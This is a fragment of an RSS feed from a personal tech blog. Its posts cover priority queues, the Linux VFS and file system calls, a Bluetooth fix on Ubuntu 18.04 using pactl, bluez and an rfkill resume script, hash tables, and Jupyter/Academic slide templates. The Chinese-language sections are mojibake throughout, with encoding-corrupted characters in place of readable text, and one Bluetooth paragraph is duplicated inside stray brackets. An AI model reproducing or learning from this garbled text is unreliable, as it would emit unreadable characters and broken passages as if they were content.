&lt;p>ç®åç FIFO éåï¼åç´ çä½ç½®ä¸åç´ è¢«å å¥è¿å»æ¶åçä½ç½®ç¸åï¼ä¼åçº§éåä¸­ï¼åç´ å·ææé«ä¼åçº§ï¼éå¸¸å®ä¹ä¸ºå·ææå°ç key å¼ï¼çåç´ æ»æ¯åä»éåä¸­åºæ¥ï¼&lt;/p>
&lt;/blockquote>
&lt;h2 id="ä½¿ç¨åºæ¯">ä½¿ç¨åºæ¯ï¼&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>ä»»å¡è°åº¦&lt;/strong>: æä½ç³»ç»ä¸­çè¿ç¨è°åº¦å°±æ¯ä½¿ç¨ä¼åçº§éåï¼æäºè¿ç¨ä¼åçº§å°±æ¯è¦é«äºå¶ä»è¿ç¨ï¼ä¾å¦æ¥çµè¯ä¼åçº§æ¯ç©æ¸¸æé«ï¼&lt;/li>
&lt;li>&lt;strong>æåº&lt;/strong>ï¼ æä»¬å°åç´ æå¥å°ä¸ä¸ª priority queueä¹åï¼åç´ å¨ä¼åçº§éåéå°±å·²ç»æ¯æå¥½åºçäº(æ¶é´å¤æåº¦ï¼ã$O(n \log n)$)&lt;/li>
&lt;li>&lt;strong>ä½¿ç¨å¨å¤æçç®æ³ä¸­&lt;/strong>ï¼ãæ¯å¦ Dijksta&amp;rsquo;s Shortest path algorithm ç®æ³ä¸­ä½¿ç¨ priority queue æ¥ä¿ææ²¡ä¸ä¸ªæ¶å»çè·¯å¾é¿åº¦&lt;/li>
&lt;/ul>
&lt;h2 id="æ¯æçæä½">æ¯æçæä½&lt;/h2>
&lt;p>ææçä¼åçº§éåé½æ¯æçæä½ï¼&lt;/p>
&lt;ul>
&lt;li>insert(e,k) : Insert a new element e with key k (æå¥ä¸ä¸ªä¼åçº§æ°å¼ä¸ºkeyçåç´ e, keyå¼è¶å°ä¼åçº§è¶å¤§)&lt;/li>
&lt;li>remove-min: å é¤å¹¶è¿åkeyå¼æå°çåç´ (ä¼åçº§æå¤§ï¼ä¹å°±æ¯å¨éé¦çåç´ )&lt;/li>
&lt;/ul>
&lt;p>ç¹æ®æä½ï¼&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Decrease-key(e, kï¼&lt;/strong>:åå°ä¼åçº§éåä¸­ key ä¸º e çåç´ çæ°å¼(åå°éä¸º k å¼)&lt;/li>
&lt;li>Increase-key(e, kï¼:å¢å ä¼åçº§éåä¸­ key ä¸º e çåç´ çæ°å¼(å¢å éä¸º k å¼)&lt;/li>
&lt;li>Delete(e): å¨ä¼åçº§éåä¸­å»æ keyãå¼ä¸º eãçåç´ &lt;/li>
&lt;li>Find-min: è¿åæåä¼åçº§éåä¸­çæå°å¼çæé&lt;/li>
&lt;/ul>
&lt;p>Decrease-key(e, kï¼å¸¸å¸¸è¢«ä½¿ç¨ï¼æ¯å¦è¿ªæ°æ¯ç¹æç®æ³ä¸­éè¦ç»å¸¸ä½¿ç¨ï¼å ä¸ºç½ç»ç»ç¹çæå¼ä¸æ¦åçååï¼é£ä¹å°±éè¦éæ°æ´æ°ä¸è¾¹ä¼åçº§éå&lt;/p>
&lt;p>ä¸é¢çå ä¸ªæä½æ¯å¯ä»¥ç¸äºè¿è¡è½¬æ¢çï¼&lt;/p>
&lt;ul>
&lt;li>å¦æç»æä»¬ &lt;em>Insert(e, k)&lt;/em> åã&lt;em>delete(e)&lt;/em> æä½ï¼æä»¬å¯ä»¥éè¿è¿ä¸¤ä¸ªæä½å®ç°ã&lt;em>increase-key&lt;/em>ãåã&lt;em>decrease-key&lt;/em>ãæä½&lt;/li>
&lt;li>å¦æç»æä»¬ &lt;em>increase-key&lt;/em>ãåã&lt;em>decrease-key&lt;/em>ãæä½æä½ï¼æä»¬å¯ä»¥éè¿è¿ä¸¤ä¸ªæä½å®ç°ã&lt;em>delete(e)&lt;/em> æä½&lt;/li>
&lt;li>å¦æç»æä»¬ &lt;em>find-min&lt;/em>ãåã&lt;em>delete&lt;/em>ãæä½æä½ï¼æä»¬å¯ä»¥éè¿è¿ä¸¤ä¸ªæä½å®ç°ã&lt;em>remove-min&lt;/em> æä½&lt;/li>
&lt;li>å¦æç»æä»¬ &lt;em>remove-min&lt;/em>ãåã&lt;em>insert&lt;/em>ãæä½æä½ï¼æä»¬å¯ä»¥éè¿è¿ä¸¤ä¸ªæä½å®ç°ã&lt;em>find-min&lt;/em> æä½&lt;/li>
&lt;/ul>
&lt;!-- more -->
&lt;hr></description></item><item><title>Linux Basic Concepts</title><link>http://www.guozet.me/post/Linux-Basic-Concepts/</link><pubDate>Mon, 25 Mar 2019 10:03:10 +0000</pubDate><guid>http://www.guozet.me/post/Linux-Basic-Concepts/</guid><description>&lt;h1 id="vfs-æä»¶ç³»ç»">VFS æä»¶ç³»ç»&lt;/h1>
&lt;p>VFS æ¯ä¸ä¸ªè½¯ä»¶å±,ç¨æ¥å¤çä¸ Unix/Linux æ åæä»¶ç³»ç»ç¸å³çææç³»ç»è°ç¨ãæ¯ç¨æ·åºç¨ç¨åºä¸æä»¶ç³»ç»å®ç°ä¹é´çæ½è±¡å±,VFS è½ä¸ºåç§æä»¶ç³»ç»æä¾ä¸ä¸ªéç¨çãç»ä¸çæ¥å£ã(ä½ç¨)&lt;/p>
&lt;p>VFS ä¸­æè¿°åå¯¹è±¡çæ°æ®ç»æ:&lt;/p>
&lt;ul>
&lt;li>è¶çº§åå¯¹è±¡ super_block;&lt;/li>
&lt;li>ç´¢å¼èç¹å¯¹è±¡ inode;&lt;/li>
&lt;li>æä»¶å¯¹è±¡ file;&lt;/li>
&lt;li>ç®å½é¡¹å¯¹è±¡ dentryã&lt;/li>
&lt;/ul>
&lt;!-- more -->
&lt;h2 id="è¶çº§åå¯¹è±¡super-block">è¶çº§åå¯¹è±¡(super block)&lt;/h2>
&lt;p>è¶çº§åå¯¹è±¡æè¿°ä¸ä¸ªæä»¶ç³»ç»çä¿¡æ¯;å¯¹äºæ¯ä¸ªå·ä½çæä»¶ç³»ç»æ¥è¯´,é½æåèªçè¶çº§å,å¦ Ext2 è¶çº§å,å¹¶è¢«å­æ¾å¨ç£çç¹å®æåºä¸ãå½åæ ¸å¯¹ä¸ä¸ªå·ä½æä»¶ç³»ç»è¿è¡ mount å®è£æ¶,è°ç¨æä»¶ç³»ç»æä¾çå½æ°ä¸ºå¶åéä¸ä¸ª VFS è¶çº§å,å¹¶ä»æ­¤å¤è¯»åå·ä½æä»¶ç³»ç»è¶çº§åä¸­çä¿¡æ¯å¡«åè¿æ¥ã&lt;/p>
&lt;p>VFS è¶çº§åæ¯åä¸ªå·ä½æä»¶ç³»ç»å®è£æ¶æå»ºç«ç,å¹¶å¨è¿äºå·ä½æä»¶ç³»ç»å¸è½½æ¶è¢«èªå¨å é¤,æ VFS è¶çº§åä»å­äºä¸»å­ä¸­&lt;/p>
&lt;p>&lt;strong>å·ä½æä»¶ç³»ç»ç VFS è¶çº§åå¯¹è±¡ä½æ¶è¢«åå»º?å¦ä½è¢«åå»º?&lt;/strong>&lt;/p>
&lt;p>å¨æè½½çæ¶åè¢«åå»º,åå»ºçæ¹å¼æ¯ get_sb å kill_sb åå«æ¯å¨æè½½(mount)åå¸è½½(unmount)æä»¶ç³»ç»å®ä¾æ¶ä¼è¢«è°ç¨çæ¹æ³ãVFS éè¿ get_sb() å½æ°è¯»åè¶çº§å,éè¿ kill_sb() å½æ°å é¤è¶çº§åã&lt;/p>
&lt;p>&lt;strong>æä»¶ç³»ç»è¢«æè½½æ¶è¯¥æä»¶ç³»ç»å¿é¡»æ¯æ³¨åè¿çåå ?&lt;/strong>&lt;/p>
&lt;p>å¨æè½½çæ¶åä¼æ£æ¥è¯¥æä»¶ç³»ç»ç±»åæ¯ä¸æ¯å·²ç»æ³¨åè¿çæä»¶ç³»ç»çç±»å,å¦ææ¯,åå¨ç³»ç»ä¸­æ¾å°å¯¹åºçæä»¶ç³»ç»çç¸å³æ°æ®ç»æ,ç¨æ¥å¡«å VFS çè¶çº§åå¯¹è±¡ã&lt;/p>
&lt;p>æ¯ä¸ªæä»¶ç³»ç»é½æä¸ä¸ªåå§åå½æ°,ä»ç¨äºå VFS æ³¨å,å³å¡«åæ file_systems æåçæä»¶ç³»ç»æ³¨åè¡¨æ°æ®ç»æ file_system_typeãæ¯ä¸ä¸ªæä»¶ç³»ç»ç±»åå¨æ³¨åè¡¨ä¸­æä¸ä¸ªç»è®°é¡¹,è®°å½äºè¯¥æä»¶ç³»ç»çç±»åå,æä»¶ç³»ç»ç¹æ§,æåå¯¹åºç VFS æ°æ®åè¯»åå½æ°çå°ååå·²æ³¨åé¡¹çé¾æéç­ãå½è£å¥ä¸ä¸ªæä»¶ç³»ç»æ¶,åºé¦åååæ ¸æ³¨åè¯¥æä»¶åå¶ç±»å,å½å¸è½½ä¸ä¸ªæä»¶ç³»ç»æ¶,åºååæ ¸ç³è¯·æ³¨éè¯¥ç³»
ç»åç±»åãæä»¶ç³»ç»ç±»åçæ³¨ååæ å¨ä»¥ file_systems ä¸ºé¾è¡¨å¤´,ä»¥ file_system_type ä¸ºèç¹çé¾è¡¨ä¸­ãé¾è¡¨çæ¯ä¸ä¸ª file_system_type èç¹æè¿°äºä¸ä¸ªå·²æ³¨åçæä»¶ç³»ç»ç±»åã&lt;/p>
&lt;h2 id="ç´¢å¼ç»ç¹å¯¹è±¡inode">ç´¢å¼ç»ç¹å¯¹è±¡(inode)&lt;/h2>
&lt;p>Inode å¯¹è±¡ååå«äºåæ ¸å¨æä½æä»¶æç®å½æ¶éè¦çå¨é¨ä¿¡æ¯,æä»¶åå¯ä»¥æ´æ¹,ä½ inode å¯¹æä»¶æ¯å¯ä¸ç, ä¸éæä»¶çå­å¨èå­å¨ãä¸ä¸ª Inode ä»£è¡¨æä»¶ç³»ç»ä¸­çä¸ä¸ªæä»¶,å®å¯ä»¥æ¯è®¾å¤æç®¡éè¿ç±»ç¹æ®æä»¶,æ Inode ä¸­ä¼åå«ç¹æ®çé¡¹ãVFS ææ¯ä¸ªç®å½çä½ä¸ä¸ªæä»¶,å¦å¨è·¯å¾/tmp/test ä¸­,tmp å test é½æ¯æä»¶, tmp æ¯ç®å½æä»¶,è test æ¯æ®éæä»¶; tmp å test é½æä¸ä¸ª inode å¯¹è±¡è¡¨ç¤ºãæ¯ä¸ä¸ªæä»¶é¤äºæä¸ä¸ª inode æ°æ®ç»æå¤,è¿æä¸ä¸ª dentry æ°æ®ç»æä¸ä¹å³è,è¯¥ç»æä¸­ç d_inode æéæåç¸åºç inode ç»æã&lt;/p>
&lt;h2 id="æä»¶å¯¹è±¡file">æä»¶å¯¹è±¡(file)&lt;/h2>
&lt;p>æä»¶å¯¹è±¡å¨ç£çä¸æ²¡ææ å,å¨æä»¶è¢«æå¼æ¶åå»ºç±ä¸ä¸ª file ç»æç»æãæä»¶å¯¹è±¡ä¸­çä¿¡æ¯ä¸»è¦æ¯æä»¶æé,å³æä»¶ä¸­å½åçä½ç½®,ä¸ä¸ä¸ªæä½å°å¨è¯¥ä½ç½®åçãfile ç»æé¤ä¿å­æä»¶å½åä½ç½®å¤,è¿ææåè¯¥æä»¶ inode çæéæ¾å¨å¶ä¸­,å¹¶å½¢æä¸ä¸ªåé¡¹é¾è¡¨,ç§°ç³»ç»æå¼æä»¶è¡¨.&lt;/p>
&lt;h2 id="ç®å½é¡¹å¯¹è±¡dentry">ç®å½é¡¹å¯¹è±¡(dentry)&lt;/h2>
&lt;p>Dentry æ°æ®ç»æå¯ä»¥å å¿«å¯¹æä»¶çå¿«éå®ä½,æ¹è¿æä»¶ç³»ç»çæçãDentry æè¿°æä»¶çé»è¾å±æ§,å®å¨ç£çä¸æ²¡æå¯¹åºçæ å; inode ç»æè®°å½æä»¶çç©çå±æ§,å¨ç£çä¸æå¯¹åºçæ å.&lt;/p>
&lt;hr>
&lt;h2 id="ä¸è¿ç¨æå³çæä»¶ç³»ç»çæ°æ®ç»æåä½ç¨files_struct-fs_struct">ä¸è¿ç¨æå³çæä»¶ç³»ç»çæ°æ®ç»æåä½ç¨(Files_struct, fs_struct)&lt;/h2>
&lt;h3 id="ç¨æ·æå¼æä»¶ç¸å³ä¿¡æ¯-files_struct">ç¨æ·æå¼æä»¶ç¸å³ä¿¡æ¯ files_struct&lt;/h3>
&lt;p>&lt;img src="http://www.guozet.me/images/2019-03-25-11-03-01.png" alt="">&lt;/p>
&lt;p>ç³»ç»æå¼è¡¨ä¿¡æ¯&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/2019-03-25-11-03-59.png" alt="">&lt;/p>
&lt;h3 id="è¿ç¨çå½åå·¥ä½ç®å½ä¸æ ¹ç®å½ç¸å³ä¿¡æ¯-fs_struct">è¿ç¨çå½åå·¥ä½ç®å½ä¸æ ¹ç®å½ç¸å³ä¿¡æ¯ fs_struct&lt;/h3>
&lt;h2 id="open-çæ§è¡è¿ç¨">Open çæ§è¡è¿ç¨&lt;/h2>
&lt;p>è¯»åæä»¶ä¹åå¿é¡»åæå¼æä»¶ãå¨æä»¶è¢«æå¼çè¿ç¨ä¸­,è¦æ ¹æ®ç»å®çæä»¶è·¯å¾åæç´¢ç®å½ç»æãå¨åå­,å¸¸å¸¸ç¼å­é¨åç®å½ç»æä»¥ä¾¿å éç®å½æä½ãä¸æ¦æä»¶è¢«æ¾å°,æä»¶ç FCB è¢«å¤å¶å°åå­éçç³»ç»æå¼æä»¶è¡¨éãè¯¥è¡¨ä¸ä»å­å¨ FCB,è¿è®°å½æå¼è¯¥æä»¶çè¿ç¨æ°ãæ¥ç,å¨è¿ç¨æå¼æä»¶è¡¨éåå»ºä¸ä¸ªæéå­æ®µ,æåç³»ç»æå¼æä»¶è¡¨éç¸åºçè¡¨é¡¹ã&lt;/p>
&lt;p>æå¼æä»¶ç³»ç»è°ç¨è¿åæåè¿ç¨æå¼æä»¶è¡¨ç¸åºé¡¹çæé,ä»¥åæä»¶çæä½é½éè¿è¿ä¸ªæéè¿è¡ãå¨ UNIX ç³»ç»,æå¼æä»¶ç³»ç»è°ç¨è¿åçæ¯æä»¶æè¿°ç¬¦.&lt;/p>
&lt;blockquote>
&lt;p>æ³¨æ:å¨ linux ä¸­æä»¶æ§å¶åä¸º inode é¡¹&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/2019-03-25-10-45-52.png" alt="">&lt;/p>
&lt;p>å½è¿ç¨å³é­æä»¶æ¶,ç¸åºçè¿ç¨æå¼æä»¶è¡¨é¡¹è¢«å é¤,ç¸åºçç³»ç»æå¼æä»¶è¡¨é¡¹éçæä»¶æå¼æ¬¡æ°åä¸ãå½æææå¼è¯¥æä»¶çè¿ç¨é½å³é­è¯¥æä»¶æ¶,å·²ä¿®æ¹çæä»¶ä¿¡æ¯è¢«ååç£ç,ç¸åºçç³»ç»æå¼æä»¶è¡¨é¡¹è¢«å é¤ã&lt;/p>
&lt;p>å®éä¸,open ç³»ç»è°ç¨é¦åæç´¢ç³»ç»æå¼æä»¶è¡¨,çè¯¥æä»¶æ¯å¦å·²è¢«å¶å®è¿ç¨æå¼äºãå¦æå·²ç»æå¼äº,å¨è¿ç¨æå¼æä»¶è¡¨éå¢å ä¸ä¸ªæé,æåè¯¥æä»¶å¨ç³»ç»æå¼æä»¶è¡¨éæå ç¨çè¡¨é¡¹å³å¯ã VFS ç³»ç»è°ç¨çå®ç°è¿ç¨:&lt;/p>
&lt;p>æä»¶çæå¼ä¸å³é­&lt;/p>
&lt;ul>
&lt;li>ç¨æ·è¿ç¨å¨è¯»/åä¸ä¸ªæä»¶ä¹åå¿é¡»åæå¼è¿ä¸ªæä»¶ãæè°æå¼æä»¶å®è´¨ä¸æ¯å¨è¿ç¨ä¸æä»¶ä¹é´å»ºç«è¿æ¥,èæå¼æä»¶æè¿°ç¬¦å¯ä¸å°æ è¯çè¿ä¸ªè¿æ¥ã&lt;/li>
&lt;li>åºç¨ç¨åºå¯¹ open ( )çè°ç¨å°å¼èµ·åæ ¸è°ç¨æå¡ä¾ç¨ sys_open ( )å½æ°,è¯¥å½æ°æ¥æ¶çåæ°ä¸º: è¦æå¼æä»¶çè·¯å¾ååè®¿é®æ¨¡å¼ç­ãè¯¥ç³»ç»è°ç¨æååå°è¿åä¸ä¸ªæä»¶æè¿°ç¬¦,ä¹å°±æ¯æä»¶å¯¹è±¡æ
éæ°ç»çä¸ä¸ªç´¢å¼;ç³»ç»è°ç¨ä¸æåæ¶è¿å-1ã&lt;/li>
&lt;li>ç¨æ·ç¨åºéè¿ close ( )ç³»ç»è°ç¨å³é­æå¼çæä»¶,è¯¥å½æ°æ¥æ¶çåæ°ä¸ºè¦å³é­æä»¶çæä»¶æè¿°ç¬¦ãåæ ¸æå¡ä¾ç¨ä¸º sys_close ( )å½æ°ã&lt;/li>
&lt;/ul>
&lt;p>æä»¶çè¯»ä¸å&lt;/p>
&lt;ul>
&lt;li>æä»¶çè¯»/åä¸»è¦æ¯éè¿ç³»ç»è°ç¨ read ( )å write ( )å®æç,å¯¹äºè¯»/åæä»¶çè¿ç¨,ç®æ æä»¶æ¯ç±ä¸ä¸ªæå¼æä»¶æè¿°ç¬¦ä»£è¡¨çã&lt;/li>
&lt;li>read ( )å write ( )çæå¡ä¾ç¨åå«æ¯ sys_read ( )å sys_write ( )å½æ°ãå®ä»¬é½éè¦ä¸ä¸ªåæ°:ä¸ä¸ªæä»¶æè¿°ç¬¦ fd;ä¸ä¸ªåå«è¦ä¼ éæ°æ®çåå­ç¼å²åºå°å buf;ä¸ä¸ªæå®åºè¯¥ä¼ éå¤å°å­èæ°ç countãread ( )ææ°æ®ä»æä»¶ä¼ éå°ç¼å²åº,è write ( )æ§è¡ç¸åçæä½ã&lt;/li>
&lt;li>ä¸¤ä¸ªç³»ç»è°ç¨é½è¿åææåä¼ éçå­èæ°,æèåä¸ä¸ªéè¯¯ä¿¡å·å¹¶è¿å-1ãè¯»æåæä½æ»æ¯åçå¨ç±å½åæä»¶æéææå®çæä»¶åç§»éå¤(æä»¶å¯¹è±¡ç f_pos å)ãä¸¤ä¸ªç³»ç»è°ç¨é½éè¿ææä¼ éçå­èæ°å å°æä»¶æéæ¥æ´æ°æä»¶æé&lt;/li>
&lt;/ul></description></item><item><title>Linux Bluetooth Setting</title><link>http://www.guozet.me/post/Linux-Bluetooth-Setting/</link><pubDate>Tue, 19 Feb 2019 13:55:25 +0000</pubDate><guid>http://www.guozet.me/post/Linux-Bluetooth-Setting/</guid><description>&lt;h1 id="introduce">Introduce&lt;/h1>
&lt;p>[I ran into this issue on my Lenovo P51 running Ubuntu 18.04, and I discovered that the pactl module &amp;ldquo;module-bluetooth-discover&amp;rdquo; was not loading properly at boot time. I fixed the issue by replacing it with &amp;ldquo;module-bluez5-discover&amp;rdquo; in my pulse configuration.&lt;/p>
&lt;p>You can test this by running:&lt;br>
&lt;code>sudo pactl unload-module module-bluetooth-discover&lt;/code>&lt;br>
&lt;code>sudo pactl load-module module-bluez5-discover&lt;/code>&lt;/p>
&lt;p>And try to repair/reconnect your devices. If it works, replicate the following configuration in your /etc/pulse/default.pa config.
](
4&lt;/p>
&lt;p>I ran into this issue on my Lenovo P51 running Ubuntu 18.04, and I discovered that the pactl module &amp;ldquo;module-bluetooth-discover&amp;rdquo; was not loading properly at boot time. I fixed the issue by replacing it with &amp;ldquo;module-bluez5-discover&amp;rdquo; in my pulse configuration.&lt;/p>
&lt;p>You can test this by running:&lt;br>
&lt;code>sudo pactl unload-module module-bluetooth-discover&lt;/code>&lt;br>
&lt;code>sudo pactl load-module module-bluez5-discover&lt;/code>&lt;/p>
&lt;p>And try to repair/reconnect your devices. If it works, replicate the following configuration in your /etc/pulse/default.pa config.&lt;/p>
&lt;pre>&lt;code># Modify: /etc/pulse/default.pa
# Comment out the following line
.ifexists module-bluetooth-discover.so
load-module module-bluetooth-discover
.endif
# Replace it with ...
.ifexists module-bluez5-discover.so
load-module module-bluez5-discover
.endif
&lt;/code>&lt;/pre>
&lt;p>My suspicion is that this is a change that was made during the switch from Unity to Gnome and the leftover configurations remained, leaving the standard Bluetooth modules behind which don&amp;rsquo;t load correctly.&lt;/p>
&lt;p>After switching to bluez5, I have since had no issues, and Bluetooth connects without complaint on my mobile phone, mouse, and headset. :)&lt;/p>
&lt;p>EDIT: I also followed several steps mentioned here:
&lt;a href="https://askubuntu.com/questions/1036195/bluetooth-doesnt-work-after-resuming-from-sleep-ubuntu-18-04-lts?noredirect=1&amp;amp;lq=1" target="_blank" rel="noopener">Bluetooth doesn&amp;rsquo;t work after resuming from sleep, Ubuntu 18.04 LTS&lt;/a>&lt;/p>
&lt;p>To exactly replicate my configuration, make sure you &lt;code>apt-get install bluez blueman pulseaudio&lt;/code>to have all the same packages. As was suggested in the referenced problem, I believe this was caused by upgrading to 18.04 from 17.04.)&lt;/p>
&lt;h2 id="update-bluez-to-5282">update bluez to &amp;gt;=5.28.2&lt;/h2>
&lt;p>18.04 ships with a buggy bluez package for now; newer version is available from this PPA:
&lt;a href="https://launchpad.net/~bluetooth/&amp;#43;archive/ubuntu/bluez" target="_blank" rel="noopener">https://launchpad.net/~bluetooth/+archive/ubuntu/bluez&lt;/a>:&lt;/p>
&lt;pre>&lt;code>sudo add-apt-repository ppa:bluetooth/bluez
sudo apt install bluez
&lt;/code>&lt;/pre>
&lt;hr>
&lt;h3 id="workaround-for-buggy-bluetooth-applet-unity-specific">workaround for buggy Bluetooth applet (Unity specific?)&lt;/h3>
&lt;p>This is probably the issue @solstice mentioned - BT menu applet doesn&amp;rsquo;t let me enable Bluetooth after resuming from sleep. No matter if the toggle switch is off or on, the BT icon is disabled, and rfkill output doesn&amp;rsquo;t change:&lt;/p>
&lt;pre>&lt;code>$ rfkill list
0: phy0: Wireless LAN
Soft blocked: no
Hard blocked: no
12: hci0: Bluetooth
Soft blocked: no
Hard blocked: no
&lt;/code>&lt;/pre>
&lt;p>You can toggle BT manually by running (substitute your own ID):&lt;/p>
&lt;pre>&lt;code>rfkill block 12
rfkill unblock 12
&lt;/code>&lt;/pre>
&lt;p>and BT applet should pick it up correctly now. At this point, you should be able to connect to your devices. For now I&amp;rsquo;ve hacked it together using a script that does this automatically after resume:&lt;/p>
&lt;pre>&lt;code>$ cat /lib/systemd/system-sleep/bt
#!/bin/sh
case $1 in
post)
sleep 5
rfkill block `rfkill list | grep hci | cut -d: -f1`
sleep 1
rfkill unblock `rfkill list | grep hci | cut -d: -f1`
;;
esac
&lt;/code>&lt;/pre>
&lt;p>The ID number next to hci0 in rfkill list output seems to increment after every suspend/resume. Disabling/enabling BT using the BT menu should change the output (&amp;lsquo;soft blocked: yes&amp;rsquo; for BT disabled via menu), but it doesn&amp;rsquo;t. My guess is that the applet remembers the wrong device ID and is thus trying to enable a device that no longer exists.&lt;/p></description></item><item><title>Algorithm part I Hash Table</title><link>http://www.guozet.me/post/Algorithm-part-I-Hash-Table/</link><pubDate>Sun, 10 Feb 2019 12:07:23 +0000</pubDate><guid>http://www.guozet.me/post/Algorithm-part-I-Hash-Table/</guid><description>&lt;h1 id="hash-table">Hash Table&lt;/h1>
&lt;p>There are four part we need to talk about the Hash-Table: &lt;code>Hash Function&lt;/code>, &lt;code>Separate Chaining&lt;/code>, &lt;code>Linear Probing&lt;/code> and &lt;code>Context&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>Hash tables, a data structure that achieves constant-time performance for core symbol table operations, provided that search keys are standard data types or simply defined. Then we consider several fundamental (and useful) examples of symbol-table clients.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Basic Plan For Hash-Table&lt;/strong>&lt;/p>
&lt;p>Save items in a &lt;code>key-indexed table&lt;/code> (index is a function of the key).&lt;/p>
&lt;p>Hash function. Method for computing array index from key.&lt;/p>
&lt;p>&lt;code>Hash(&amp;quot;it&amp;quot;) = 3&lt;/code>&lt;/p>
&lt;p>The issues for this part:&lt;/p>
&lt;ul>
&lt;li>We need to computing the hash function.&lt;/li>
&lt;li>Equality test: Method for checking whether tow keys are equal.&lt;/li>
&lt;li>Collision resolution: Algorithm and data structure to handle tow keys that hash to the same array index.&lt;/li>
&lt;/ul>
&lt;p>Classic space-time tradeoff.&lt;/p>
&lt;ul>
&lt;li>No space limitation: Travial hash function with key as index.&lt;/li>
&lt;li>No time limitation: Travial collision resolution with sequential search.&lt;/li>
&lt;li>Space and time limitations: Hashing(The real world.)&lt;/li>
&lt;/ul>
&lt;h1 id="hash-function">Hash function&lt;/h1>
&lt;ul>
&lt;li>Efficiently computable&lt;/li>
&lt;/ul></description></item><item><title>Display Jupyter Notebooks with Academic</title><link>http://www.guozet.me/post/jupyter/</link><pubDate>Tue, 05 Feb 2019 00:00:00 +0000</pubDate><guid>http://www.guozet.me/post/jupyter/</guid><description>&lt;pre>&lt;code class="language-python">from IPython.core.display import Image
Image('https://www.python.org/static/community_logos/python-logo-master-v3-TM-flattened.png')
&lt;/code>&lt;/pre>
&lt;p>&lt;img src="./index_1_0.png" alt="png">&lt;/p>
&lt;pre>&lt;code class="language-python">print(&amp;quot;Welcome to Academic!&amp;quot;)
&lt;/code>&lt;/pre>
&lt;pre>&lt;code>Welcome to Academic!
&lt;/code>&lt;/pre>
&lt;h2 id="install-python-and-jupyterlab">Install Python and JupyterLab&lt;/h2>
&lt;p>
&lt;a href="https://www.anaconda.com/distribution/#download-section" target="_blank" rel="noopener">Install Anaconda&lt;/a> which includes Python 3 and JupyterLab.&lt;/p>
&lt;p>Alternatively, install JupyterLab with &lt;code>pip3 install jupyterlab&lt;/code>.&lt;/p>
&lt;h2 id="create-or-upload-a-jupyter-notebook">Create or upload a Jupyter notebook&lt;/h2>
&lt;p>Run the following commands in your Terminal, substituting &lt;code>&amp;lt;MY-WEBSITE-FOLDER&amp;gt;&lt;/code> and &lt;code>&amp;lt;SHORT-POST-TITLE&amp;gt;&lt;/code> with the file path to your Academic website folder and a short title for your blog post (use hyphens instead of spaces), respectively:&lt;/p>
&lt;pre>&lt;code class="language-bash">mkdir -p &amp;lt;MY-WEBSITE-FOLDER&amp;gt;/content/post/&amp;lt;SHORT-POST-TITLE&amp;gt;/
cd &amp;lt;MY-WEBSITE-FOLDER&amp;gt;/content/post/&amp;lt;SHORT-POST-TITLE&amp;gt;/
jupyter lab index.ipynb
&lt;/code>&lt;/pre>
&lt;p>The &lt;code>jupyter&lt;/code> command above will launch the JupyterLab editor, allowing us to add Academic metadata and write the content.&lt;/p>
&lt;h2 id="edit-your-post-metadata">Edit your post metadata&lt;/h2>
&lt;p>The first cell of your Jupter notebook will contain your post metadata (
&lt;a href="https://sourcethemes.com/academic/docs/front-matter/" target="_blank" rel="noopener">front matter&lt;/a>).&lt;/p>
&lt;p>In Jupter, choose &lt;em>Markdown&lt;/em> as the type of the first cell and wrap your Academic metadata in three dashes, indicating that it is YAML front matter:&lt;/p>
&lt;pre>&lt;code>---
title: My post's title
date: 2019-09-01
# Put any other Academic metadata here...
---
&lt;/code>&lt;/pre>
&lt;p>Edit the metadata of your post, using the
&lt;a href="https://sourcethemes.com/academic/docs/managing-content" target="_blank" rel="noopener">documentation&lt;/a> as a guide to the available options.&lt;/p>
&lt;p>To set a
&lt;a href="https://sourcethemes.com/academic/docs/managing-content/#featured-image" target="_blank" rel="noopener">featured image&lt;/a>, place an image named &lt;code>featured&lt;/code> into your post&amp;rsquo;s folder.&lt;/p>
&lt;p>For other tips, such as using math, see the guide on
&lt;a href="https://sourcethemes.com/academic/docs/writing-markdown-latex/" target="_blank" rel="noopener">writing content with Academic&lt;/a>.&lt;/p>
&lt;h2 id="convert-notebook-to-markdown">Convert notebook to Markdown&lt;/h2>
&lt;pre>&lt;code class="language-bash">jupyter nbconvert index.ipynb --to markdown --NbConvertApp.output_files_dir=.
&lt;/code>&lt;/pre>
&lt;h2 id="example">Example&lt;/h2>
&lt;p>This post was created with Jupyter. The orginal files can be found at &lt;a href="https://github.com/gcushen/hugo-academic/tree/master/exampleSite/content/post/jupyter">https://github.com/gcushen/hugo-academic/tree/master/exampleSite/content/post/jupyter&lt;/a>&lt;/p></description></item><item><title>Slides</title><link>http://www.guozet.me/slides/example/</link><pubDate>Tue, 05 Feb 2019 00:00:00 +0000</pubDate><guid>http://www.guozet.me/slides/example/</guid><description>&lt;h1 id="create-slides-in-markdown-with-academic">Create slides in Markdown with Academic&lt;/h1>
&lt;p>
&lt;a href="https://sourcethemes.com/academic/" target="_blank" rel="noopener">Academic&lt;/a> |
&lt;a href="https://sourcethemes.com/academic/docs/managing-content/#create-slides" target="_blank" rel="noopener">Documentation&lt;/a>&lt;/p>
&lt;hr>
&lt;h2 id="features">Features&lt;/h2>
&lt;ul>
&lt;li>Efficiently write slides in Markdown&lt;/li>
&lt;li>3-in-1: Create, Present, and Publish your slides&lt;/li>
&lt;li>Supports speaker notes&lt;/li>
&lt;li>Mobile friendly slides&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="controls">Controls&lt;/h2>
&lt;ul>
&lt;li>Next: &lt;code>Right Arrow&lt;/code> or &lt;code>Space&lt;/code>&lt;/li>
&lt;li>Previous: &lt;code>Left Arrow&lt;/code>&lt;/li>
&lt;li>Start: &lt;code>Home&lt;/code>&lt;/li>
&lt;li>Finish: &lt;code>End&lt;/code>&lt;/li>
&lt;li>Overview: &lt;code>Esc&lt;/code>&lt;/li>
&lt;li>Speaker notes: &lt;code>S&lt;/code>&lt;/li>
&lt;li>Fullscreen: &lt;code>F&lt;/code>&lt;/li>
&lt;li>Zoom: &lt;code>Alt + Click&lt;/code>&lt;/li>
&lt;li>
&lt;a href="https://github.com/hakimel/reveal.js#pdf-export" target="_blank" rel="noopener">PDF Export&lt;/a>: &lt;code>E&lt;/code>&lt;/li>
&lt;/ul>
